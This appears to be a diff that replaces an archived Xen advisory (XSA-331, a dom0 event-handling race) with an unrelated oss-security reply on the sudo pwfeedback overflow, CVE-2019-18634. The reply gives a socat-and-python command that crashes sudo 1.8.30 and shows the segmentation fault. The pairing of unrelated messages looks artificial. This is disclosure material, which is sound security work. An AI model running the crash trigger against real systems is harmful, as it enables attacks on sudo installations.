@@ -1,110 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/20/1
-Message-Id: <E1kUqJd-0001yN-2q@xenbits.xenproject.org>
-Date: Tue, 20 Oct 2020 12:00:33 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 331 v2 - Race condition in Linux event handler may crash dom0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/02/05/2
+Message-ID: <CAPWJUny2yaenu_Kg7s4VhuL0nZ4Yg4XPN9HN75e5w0MU4brTnw@mail.gmail.com>
+Date: Wed, 5 Feb 2020 22:34:53 +1100
+From: William Bowling <will@...wling.info>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+When using a pty, sudo_term_eof and sudo_term_kill are initialized to 0x4
+and 0x15 allowing the overflow to be reached, making 1.8.26-1.8.30 also
+vulnerable:
 
-                    Xen Security Advisory XSA-331
-                              version 2
+$ socat pty,link=/tmp/pty,waitslave exec:"python -c
+'print((\"A\"*100+chr(0x15))*50)'" &
+$ sudo -S id < /tmp/pty
+[sudo] password for user1: Segmentation fault
+$ sudo -V
+Sudo version 1.8.30
+Sudoers policy plugin version 1.8.30
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.30
 
-         Race condition in Linux event handler may crash dom0
+- Will
 
-UPDATES IN VERSION 2
-====================
+On Sat, Feb 1, 2020 at 12:59 AM Todd C. Miller <Todd.Miller@...o.ws> wrote:
 
-Public release.
-
-ISSUE DESCRIPTION
-=================
-
-The Linux kernel event channel handling code doesn't defend the
-handling of an event against the same event channel being removed in
-parallel.
-
-This can result in accesses to already freed memory areas or NULL
-pointer dereferences in the event handling code, leading to
-misbehaviour of the system or even crashes.
-
-IMPACT
-======
-
-A misbehaving guest can trigger a dom0 crash by sending events for a
-paravirtualized device while simultaneously reconfiguring it.
-
-VULNERABLE SYSTEMS
-==================
-
-All systems with a Linux dom0 are vulnerable.
-
-All Linux kernel versions are vulnerable.
-
-MITIGATION
-==========
-
-There is no known mitigation.
-
-CREDITS
-=======
-
-This issue was discovered by Jinoh Kang of Theori.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-Note that patches for released versions are generally prepared to
-apply to the stable branches, and may not apply cleanly to the most
-recent release tarball.  Downstreams are encouraged to update to the
-tip of the stable branch before applying these patches.
-
-xsa331-linux.patch     Linux
-
-$ sha256sum xsa331*
-8583392c0c573f7baa85e41c9afbdf74dcb04aea1be992d78991f0787230a193  xsa331-linux.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
+> On Thu, 30 Jan 2020 11:23:28 -0700, "Todd C. Miller" wrote:
+>
+> > Sudo versions affected:
+> >
+> > Sudo versions 1.7.1 to 1.8.30 inclusive are affected but only if
+> > the "pwfeedback" option is enabled in sudoers.
+>
+> It turns out a change in EOF handling introduced in sudo 1.8.26
+> prevents exploitation of the bug.  The EOF character is also
+> initialized to 0 and sudo 1.8.26 checks for EOF before it checks
+> for the kill character.
+>
+> This means that the bug actually affects sudo versions 1.7.1 to
+> 1.8.25p1 inclusive.
+>
+> Sorry for the oversight.  I've updated the affected versions in
+> https://www.sudo.ws/alerts/pwfeedback.html
+>
+>  - todd
+>
 
 
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
+-- 
 
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
+GPG Key ID: 0x980F711A
 
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAl+OzqMMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZuo4H/R4b4Z7ZTMwwpL4u3PrguNZduaTc3vy9R+Gd0+5z
-hY0Zfif7SfhJ2apN4Ihs1eAGxyWLI/I8kQQGE4xKgZy2ygciMbTK0OCsoGxfEr6v
-bi4RKV9I03g3fQHy48z+lOt4XKTY8+OpHw8LYY3W7jdnQ0YJrPCOmap0Xkv91QhP
-+EkmxzahVQv0T16cP4fxZFUvY0M9gijEjE9h9Gv23M+tLP9SGkW9Hd11qM135AKh
-vVSYUIuvyd20zb5uiqXono9qP1CeKyCOXHL+YQ+K7eOjYCVbEDdREneBegFlS9By
-jaFukH/psQDdemQDT4amzOmtBzdImIzkGhflvj+b5axRlrw=
-=FLDG
------END PGP SIGNATURE-----
+GPG Key Fingerprint: AA38 2A0E 7D22 18A9 6086  0289 41DC E04B 980F 711A
 
-Download attachment "xsa331-linux.patch" of type "application/octet-stream" (4730 bytes)
